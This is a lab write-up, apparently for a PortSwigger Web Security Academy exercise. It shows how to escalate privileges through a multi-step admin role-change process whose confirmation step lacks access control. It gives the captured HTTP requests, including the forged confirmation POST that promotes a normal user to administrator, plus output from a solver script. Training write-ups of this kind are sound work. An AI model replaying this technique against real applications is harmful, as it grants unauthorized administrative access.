# Lab: Multi-step process with no access control on one step 

### Instructions

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator. 


### Solution

Logging in as admin and testing the user upgrade feature, we can capture the POST request in Burp:

```
POST /admin-roles HTTP/1.1
Host: 0afc0049042e8d7688f7692f00630040.web-security-academy.net
Cookie: session=OEYorh9PD6KeWPXZyiNbclouJz2mq2Bb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0afc0049042e8d7688f7692f00630040.web-security-academy.net
Referer: https://0afc0049042e8d7688f7692f00630040.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=carlos&action=upgrade
```

Sending this request we are prompted with:

```html
                   <h1>Are you sure?</h1>
                    <form action="/admin-roles" method="POST">
                        <input type="hidden" name="action" value="upgrade">
                        <input type="hidden" name="confirmed" value="true">
                        <input type="hidden" name="username" value="carlos">
                        <a class="button" href="/admin">No, take me back</a>
                        <button class="button" type="submit">Yes</button>
```

Capturing the confirmation in Burp we find:

```
POST /admin-roles HTTP/2
Host: 0afc0049042e8d7688f7692f00630040.web-security-academy.net
Cookie: session=OEYorh9PD6KeWPXZyiNbclouJz2mq2Bb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0afc0049042e8d7688f7692f00630040.web-security-academy.net
Referer: https://0afc0049042e8d7688f7692f00630040.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

action=upgrade&confirmed=true&username=carlos
```

Now that we know how the application behaves we can log out as admin and log back in as user wiener.

We can attempt to make the initial POST request as user wiener, but get an `unauthorized` error:

```
POST /admin-roles HTTP/2
Host: 0afc0049042e8d7688f7692f00630040.web-security-academy.net
Cookie: session=aWOdqBY6TDgzAx9Gul7W5hNdPMLDX8am
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 30

username=wiener&action=upgrade
```

```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

So access control is being enforced here.

However this is not enforced on the second step of the upgrade during the confirmation:

```
POST /admin-roles HTTP/2
Host: 0afc0049042e8d7688f7692f00630040.web-security-academy.net
Cookie: session=aWOdqBY6TDgzAx9Gul7W5hNdPMLDX8am
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 45

action=upgrade&confirmed=true&username=wiener
```

This POST request goes through fine, upgrading the user wiener, and the lab is marked solved.

### Python Solution

See `access_control_12.py`. 

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_12_multi-step_process_with_no_access_control_on_one_step]
└─$ python access_control_12.py https://0a15009f04b18d6a88f578f300be00ef.web-security-academy.net/
[+] Logged in as wiener
[+] Successfully upgraded user wiener
```